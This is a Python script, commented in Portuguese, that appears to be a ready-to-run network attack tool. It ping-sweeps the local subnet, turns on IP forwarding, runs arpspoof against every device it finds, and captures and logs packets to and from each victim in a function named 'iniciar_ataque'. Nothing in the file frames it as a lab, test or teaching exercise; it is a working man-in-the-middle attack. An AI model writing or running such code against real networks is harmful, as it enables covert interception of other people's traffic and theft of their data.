import os
import socket
import struct
import threading
from queue import Queue
from time import sleep, strftime
from datetime import datetime

def obter_ip_local():
    """Identifica automaticamente o IP local."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        sock.connect(("8.8.8.8", 80))  # Conexão simulada para capturar o IP local
        endereco_ip = sock.getsockname()[0]
    finally:
        sock.close()
    return endereco_ip

def obter_mac(interface):
    """Retorna o endereço MAC de uma interface de rede."""
    try:
        caminho = f'/sys/class/net/{interface}/address'
        with open(caminho) as arquivo:
            return arquivo.read().strip()
    except FileNotFoundError:
        print(f"[!] Interface {interface} não encontrada.")
        return None

def registrar_historico(caminho_arquivo, ip_detectado):
    """Salva o IP identificado em um arquivo de log."""
    with open(caminho_arquivo, "a") as log:
        registro = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        log.write(f"{registro} - IP detectado: {ip_detectado}\n")
        print(f"[+] IP salvo no histórico: {ip_detectado}")

def verificar_host(ip):
    """Executa um ping para determinar se o host está ativo."""
    try:
        retorno = os.system(f"ping -c 1 -W 1 {ip} > /dev/null 2>&1")
        return retorno == 0
    except Exception as erro:
        print(f"[!] Erro ao verificar host {ip}: {erro}")
        return False

def escanear_dispositivos(ip_local, hosts_ativos, arquivo_historico, max_threads=50):
    """Realiza um escaneamento para detectar dispositivos ativos na sub-rede."""
    rede = ".".join(ip_local.split(".")[:3])  # Define a sub-rede, exemplo: 192.168.1
    print(f"[*] Iniciando varredura na rede: {rede}.0/24")

    fila_ips = Queue()
    for i in range(1, 255):
        fila_ips.put(f"{rede}.{i}")

    def processo_verificacao():
        """Thread para identificar hosts ativos."""
        while not fila_ips.empty():
            ip_atual = fila_ips.get()
            if verificar_host(ip_atual):
                with threading.Lock():
                    if ip_atual not in hosts_ativos:
                        hosts_ativos.append(ip_atual)
                        registrar_historico(arquivo_historico, ip_atual)
            fila_ips.task_done()

    threads = []
    for _ in range(max_threads):
        t = threading.Thread(target=processo_verificacao)
        t.start()
        threads.append(t)

    fila_ips.join()

    for thread in threads:
        thread.join()

    print("[*] Varredura finalizada.")
    print("[*] Dispositivos ativos encontrados:", hosts_ativos)

def ativar_encaminhamento_ip():
    """Ativa o redirecionamento de pacotes no sistema."""
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

def desativar_encaminhamento_ip():
    """Desativa o redirecionamento de pacotes no sistema."""
    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")

def realizar_arp_spoof(interface, alvo_ip, ip_fake):
    """Executa ARP spoofing na rede."""
    os.system(f"sudo arpspoof -i {interface} -t {alvo_ip} {ip_fake}")

def monitorar_trafego(interface, ip_alvo, arquivo_saida):
    """Captura pacotes de rede e registra em arquivo."""
    print(f"[*] Iniciando captura de tráfego para {ip_alvo}")
    raw_socket = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(0x0800))
    pacotes_capturados = 0

    with open(arquivo_saida, "a") as log:
        try:
            while True:
                pacote, _ = raw_socket.recvfrom(65565)
                cabecalho_ethernet = pacote[:14]
                dados_ethernet = struct.unpack("!6s6sH", cabecalho_ethernet)
                if socket.ntohs(dados_ethernet[2]) == 0x0800:
                    cabecalho_ip = pacote[14:34]
                    ip_info = struct.unpack("!BBHHHBBH4s4s", cabecalho_ip)
                    protocolo = ip_info[6]
                    ip_origem = socket.inet_ntoa(ip_info[8])
                    ip_destino = socket.inet_ntoa(ip_info[9])

                    if ip_origem == ip_alvo or ip_destino == ip_alvo:
                        timestamp = strftime("%Y-%m-%d %H:%M:%S")
                        log.write(f"{timestamp} - {ip_origem} -> {ip_destino} [Protocolo {protocolo}]\n")
                        pacotes_capturados += 1
        except KeyboardInterrupt:
            print(f"[!] Captura de tráfego para {ip_alvo} interrompida.")
        finally:
            print(f"[*] Total de pacotes capturados: {pacotes_capturados}")

def iniciar_ataque():
    ip_local = obter_ip_local()
    interfaces = os.listdir('/sys/class/net/')
    interface_atual = interfaces[0] if interfaces else None
    if not interface_atual:
        print("[!] Nenhuma interface disponível.")
        return

    mac_local = obter_mac(interface_atual)
    if not mac_local:
        print("[!] Endereço MAC não identificado.")
        return

    print(f"[+] Interface: {interface_atual}, IP Local: {ip_local}, MAC Local: {mac_local}")

    ativar_encaminhamento_ip()

    hosts_identificados = []
    arquivo_historico = "log_ips.txt"
    arquivo_trafego = "log_trafego.html"

    with open(arquivo_trafego, "w") as log:
        log.write("<html><body><ul>\n")

    escanear_dispositivos(ip_local, hosts_identificados, arquivo_historico)

    if len(hosts_identificados) < 2:
        print("[!] Não há dispositivos suficientes para continuar.")
        desativar_encaminhamento_ip()
        return

    try:
        for alvo in hosts_identificados:
            threading.Thread(target=realizar_arp_spoof, args=(interface_atual, alvo, ip_local)).start()
            threading.Thread(target=monitorar_trafego, args=(interface_atual, alvo, arquivo_trafego)).start()
    except KeyboardInterrupt:
        print("[!] Ataque interrompido.")
    finally:
        desativar_encaminhamento_ip()

if __name__ == "__main__":
    iniciar_ataque()
